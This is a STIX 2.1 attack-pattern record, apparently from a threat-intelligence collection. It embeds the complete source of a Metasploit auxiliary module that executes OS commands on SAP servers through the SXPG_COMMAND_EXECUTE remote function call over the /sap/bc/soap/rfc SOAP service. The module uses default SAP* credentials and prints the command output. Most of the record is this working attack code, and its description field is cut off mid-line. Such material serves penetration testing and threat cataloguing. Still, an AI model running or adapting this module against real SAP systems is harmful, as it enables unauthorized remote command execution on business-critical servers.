{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b4204081-5e7b-41ec-a5e7-d8924b955a85",
    "created": "2024-08-14T16:27:01.292905Z",
    "modified": "2024-08-14T16:27:01.292909Z",
    "name": "SAP SOAP RFC SXPG_COMMAND_EXECUTE",
    "description": " This module makes use of the SXPG_COMMAND_EXECUTE Remote Function Call, through the use of the /sap/bc/soap/rfc SOAP service to execute OS commands as configured in the SM69 transaction.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec.rb",
            "external_id": "sap_soap_rfc_sxpg_command_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# This module is based on, inspired by, or is a port of a plugin available in\n# the Onapsis Bizploit Opensource ERP Penetration Testing framework -\n# http://www.onapsis.com/research-free-solutions.php.\n# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts\n# in producing the Metasploit modules and was happy to share his knowledge and\n# experience - a very cool guy. I'd also like to thank Chris John Riley,\n# Ian de Villiers and Joris van de Vis who have Beta tested the modules and\n# provided excellent feedback. Some people just seem to enjoy hacking SAP :)\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name' => 'SAP SOAP RFC SXPG_COMMAND_EXECUTE',\n      'Description' => %q{\n          This module makes use of the SXPG_COMMAND_EXECUTE Remote Function Call, through\n        the use of the /sap/bc/soap/rfc SOAP service to execute OS commands as configured\n        in the SM69 transaction.\n        },\n      'References' =>\n        [\n          [ 'URL', 'https://labs.f-secure.com/tools/sap-metasploit-modules/' ]\n        ],\n      'Author' =>\n        [\n          'Agnivesh Sathasivam',\n          'nmonkee'\n        ],\n      'License' => MSF_LICENSE\n    )\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptString.new('CLIENT', [true, 'SAP Client', '001']),\n        OptString.new('HttpUsername', [true, 'Username', 'SAP*']),\n        OptString.new('HttpPassword', [true, 'Password', '06071992']),\n        OptString.new('CMD', [true, 'SM69 command to be executed', 'PING']),\n        OptString.new('PARAM', [false, 'Additional parameters for the SM69 command', nil]),\n        OptEnum.new('OS', [true, 'SM69 Target OS','ANYOS',['ANYOS', 'UNIX', 'Windows NT', 'AS/400', 'OS/400']])\n      ])\n  end\n\n  def run_host(ip)\n    os = datastore['OS']\n    data = '<?xml version=\"1.0\" encoding=\"utf-8\" ?>'\n    data << '<env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">'\n    data << '<env:Body>'\n    data << '<n1:SXPG_COMMAND_EXECUTE xmlns:n1=\"urn:sap-com:document:sap:rfc:functions\" env:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">'\n    if datastore['PARAM']\n      data << '<ADDITIONAL_PARAMETERS>' + datastore['PARAM'] + ' </ADDITIONAL_PARAMETERS>'\n    else\n      data << '<ADDITIONAL_PARAMETERS> </ADDITIONAL_PARAMETERS>'\n    end\n    data << '<COMMANDNAME>' + datastore['CMD'] + '</COMMANDNAME>'\n    data << '<OPERATINGSYSTEM>' + os + '</OPERATINGSYSTEM>'\n    data << '<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>'\n    data << '</n1:SXPG_COMMAND_EXECUTE>'\n    data << '</env:Body>'\n    data << '</env:Envelope>'\n    print_status(\"[SAP] #{ip}:#{rport} - sending SOAP SXPG_COMMAND_EXECUTE request\")\n    begin\n      res = send_request_cgi({\n        'uri' => '/sap/bc/soap/rfc',\n        'method' => 'POST',\n        'data' => data,\n        'cookie' => \"sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}\",\n        'ctype' => 'text/xml; charset=UTF-8',\n        'encode_params' => false,\n        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),\n        'headers' =>{\n          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',\n        },\n        'vars_get' => {\n          'sap-client'    => datastore['CLIENT'],\n          'sap-language'  => 'EN'\n        }\n      })\n      if res and res.code != 500 and res.code != 200\n        # to do - implement error handlers for each status code, 404, 301, etc.\n        print_error(\"[SAP] #{ip}:#{rport} - something went wrong!\")\n        return\n      elsif res and res.body =~ /faultstring/\n        error = res.body.scan(%r{<faultstring>(.*?)</faultstring>}).flatten\n        0.upto(error.length-1) do |i|\n          print_error(\"[SAP] #{ip}:#{rport} - error #{error[i]}\")\n        end\n        return\n      elsif res\n        print_status(\"[SAP] #{ip}:#{rport} - got response\")\n        saptbl = Msf::Ui::Console::Table.new(\n          Msf::Ui::Console::Table::Style::Default,\n            'Header' => \"[SAP] SXPG_COMMAND_EXECUTE \",\n            'Prefix' => \"\\n\",\n            'Postfix' => \"\\n\",\n            'Indent'  => 1,\n            'Columns' =>[\"Output\",]\n            )\n        output = res.body.scan(%r{<MESSAGE>([^<]+)</MESSAGE>}).flatten\n        for i in 0..output.length-1\n          saptbl << [output[i]]\n        end\n        print(saptbl.to_s)\n        return\n      else\n        print_error(\"[SAP] #{ip}:#{rport} - Unknown error\")\n        return\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"[SAP] #{ip}:#{rport} - Unable to connect\")\n      return\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}